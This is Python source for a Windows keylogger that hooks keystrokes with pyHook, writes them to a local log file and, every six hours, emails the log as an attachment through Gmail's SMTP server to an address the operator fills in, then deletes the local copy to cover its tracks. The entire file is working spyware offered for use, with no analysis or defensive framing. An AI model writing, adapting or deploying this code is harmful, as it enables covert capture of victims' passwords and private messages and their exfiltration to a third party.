import pythoncom
import smtplib
import pyHook
import time
import datetime
import os
import win32api
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

log_file = "keylog.txt"

login = "" # insert your email here
password = "" # insert your email password here

keys = []

def on_keyboard_event(event):
    global keys

    keys.append(event.Key)

    if event.Key == "Escape":
        with open(log_file, "a") as f:
            f.write("".join(keys))
            keys = []
        return False
    return True

hm = pyHook.HookManager()
hm.KeyDown = on_keyboard_event
hm.HookKeyboard()

start_time = datetime.datetime.now()

time_interval = 6 * 60 * 60 # 6 hours

system_shutdown = False

def on_shutdown_event():
    global system_shutdown
    system_shutdown = True

win32api.SetConsoleCtrlHandler(on_shutdown_event, True)

while True:
    pythoncom.PumpWaitingMessages()
    time.sleep(0.01)

    if system_shutdown:
        hm.UnhookKeyboard()

        if os.path.exists(log_file):
            os.remove(log_file)

        break

    elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
    if elapsed_time >= time_interval:
        hm.UnhookKeyboard()

        with open(log_file, "rb") as f:
            file_content = f.read()

        # create MIME message
        msg = MIMEMultipart()
        msg['From'] = login
        msg['To'] = login
        msg['Subject'] = 'Keylogger Log'
        msg.attach(MIMEText('Keylogger log attached.', 'plain'))
        attachment = MIMEApplication(file_content, _subtype='txt')
        attachment.add_header('Content-Disposition', 'attachment', filename='keylog.txt')
        msg.attach(attachment)

        # send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(login, password)
        server.sendmail(login, login, msg.as_string())
        server.quit()

        os.remove(log_file)

        hm = pyHook.HookManager()
        hm.KeyDown = on_keyboard_event
        hm.HookKeyboard()
        start_time = datetime.datetime.now()
